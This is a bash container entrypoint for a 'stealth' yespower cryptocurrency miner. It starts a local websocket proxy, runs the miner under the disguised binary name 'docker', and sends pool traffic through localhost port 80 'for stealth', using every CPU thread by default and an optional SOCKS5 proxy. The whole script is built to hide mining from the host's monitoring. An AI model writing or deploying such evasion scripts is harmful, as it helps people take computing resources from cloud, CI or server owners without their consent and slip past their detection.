#!/bin/bash
set -e

echo "=== Stealth YesPower Miner ==="

# Jalankan local stealth proxy
node /wsproxy.js &
sleep 2

echo "⛏️  Starting cpuminer (connect to localhost:80 for stealth)..."

exec docker \
    -a yespower \
    -o stratum+tcp://127.0.0.1:80 \
    -u "${WALLET:-WALLET_ANDA}.${WORKER:-worker}" \
    -p "${PASSWORD:-c=SWAMP,mc=SWAMP}" \
    -t "${THREADS:-$(nproc)}" \
    --proxy "${SOCKS5_PROXY:+socks5://${SOCKS5_PROXY}}" \
    "$@"
